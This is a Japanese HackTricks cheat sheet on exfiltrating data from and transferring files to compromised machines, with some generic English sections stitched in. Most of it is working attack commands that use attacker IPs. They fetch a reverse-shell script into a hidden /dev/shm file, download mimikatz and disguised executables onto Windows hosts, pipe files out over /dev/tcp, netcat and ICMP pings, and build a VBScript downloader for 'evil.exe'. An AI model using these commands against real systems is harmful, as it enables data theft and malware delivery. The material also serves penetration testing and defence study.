# 情報の外部流出

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## 情報を外部流出させるための一般的にホワイトリストに登録されているドメイン

[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つける

## Base64をコピー＆ペースト

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### ファイルのアップロード

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPSサーバー**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTPサーバー（Python）
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTPサーバー（NodeJS）
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTPサーバー（pure-ftp）
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** クライアント
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kaliをサーバーとして使用
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
または、Sambaを使用してSMB共有を作成します：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
## Exfiltration

### Introduction

Exfiltration is the unauthorized transfer of data from a target. This can be achieved through various methods, such as:

- **Direct exfiltration**: Data is sent directly from the target to an external location.
- **Indirect exfiltration**: Data is first sent to an intermediate location before being transferred to an external location.
- **Covert exfiltration**: Data is hidden within other legitimate network traffic to avoid detection.

### Techniques

#### Common Exfiltration Techniques

1. **Compression**: Data is compressed before exfiltration to reduce its size and avoid detection.
2. **Encryption**: Data is encrypted to prevent unauthorized access during exfiltration.
3. **Steganography**: Data is hidden within other files or data to avoid detection.
4. **Protocol Manipulation**: Data is sent using non-standard protocols to bypass security controls.
5. **DNS Tunneling**: Data is exfiltrated through DNS requests to avoid detection.

### Tools

#### Exfiltration Tools

1. **Netcat**: A versatile networking tool that can be used for exfiltration.
2. **Wget**: A command-line utility for downloading files, which can be used for exfiltration.
3. **Curl**: Another command-line tool for transferring data, useful for exfiltration.

### Conclusion

Exfiltration is a critical phase of the attack lifecycle, where the attacker attempts to steal valuable data from the target. By understanding exfiltration techniques and using appropriate tools, attackers can successfully transfer data without being detected.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻撃者はSSHdを実行している必要があります。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

被害者がSSHを持っている場合、攻撃者は被害者から攻撃者にディレクトリをマウントすることができます。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

### Data Exfiltration

#### Description

The Netcat utility, or `nc`, is a versatile tool that can be used for data exfiltration. Netcat can create a connection between a source and a destination, allowing for the transfer of data between them. This can be leveraged by an attacker to exfiltrate sensitive information from a target network.

#### Methodology

1. **Listener Setup**: The attacker sets up a listener on a machine outside the target network using Netcat.

2. **Data Transfer**: Netcat is then used on the compromised machine within the target network to connect to the listener set up by the attacker. Data can be transferred between the two machines through this connection.

3. **Exfiltration**: The attacker can exfiltrate sensitive data by redirecting the output of commands or by transferring files using Netcat.

#### Detection

Monitoring network traffic for suspicious connections to external machines, especially using uncommon ports, can help in detecting data exfiltration using Netcat. Conducting regular security audits and implementing network segmentation can also aid in detecting and preventing such attacks.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### 攻撃対象からファイルをダウンロード
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 被害者へのファイルアップロード
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感謝 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

XPおよび2003ではデフォルトで有効（他のOSではインストール時に明示的に追加する必要がある）

Kaliでは、**TFTPサーバーを起動**します：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**PythonでのTFTPサーバー:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**被害者**で、Kaliサーバーに接続します：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHPのワンライナーを使用してファイルをダウンロードします：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

### VBScript Exfiltration Techniques

VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:

1. **Writing to Files**: VBScript can write data to files on the system, which can then be transferred out.

2. **Sending Emails**: VBScript can be used to send emails with the exfiltrated data as attachments or within the email body.

3. **HTTP Requests**: VBScript can make HTTP requests to external servers, sending the exfiltrated data in the request payload.

4. **DNS Tunneling**: VBScript can encode data in DNS requests and responses to exfiltrate information covertly.

5. **FTP Transfer**: VBScript can be used to transfer files via FTP to an external server.

6. **Executing Commands**: VBScript can execute commands to exfiltrate data through various means.

### Detection and Prevention

To detect and prevent data exfiltration via VBScript, consider the following measures:

- **Monitoring File Writes**: Monitor for suspicious file write activities by VBScript.
  
- **Network Traffic Analysis**: Analyze network traffic for any unusual patterns or connections made by VBScript.

- **Email Filtering**: Implement email filtering to prevent VBScript from sending out exfiltrated data via emails.

- **Firewall Rules**: Configure firewall rules to restrict VBScript from making unauthorized network connections.

- **Behavioral Analysis**: Conduct behavioral analysis to detect any abnormal behavior exhibited by VBScript.

By implementing these detection and prevention measures, organizations can enhance their security posture against data exfiltration using VBScript.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**被害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe`プログラムは、バイナリの検査だけでなく、**16進数からバイナリを再構築する機能**も持っています。これはつまり、バイナリの16進数を提供することで、`debug.exe`がバイナリファイルを生成できるということです。ただし、`debug.exe`には**64 kbまでのファイルをアセンブルするという制限**があることに注意することが重要です。
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
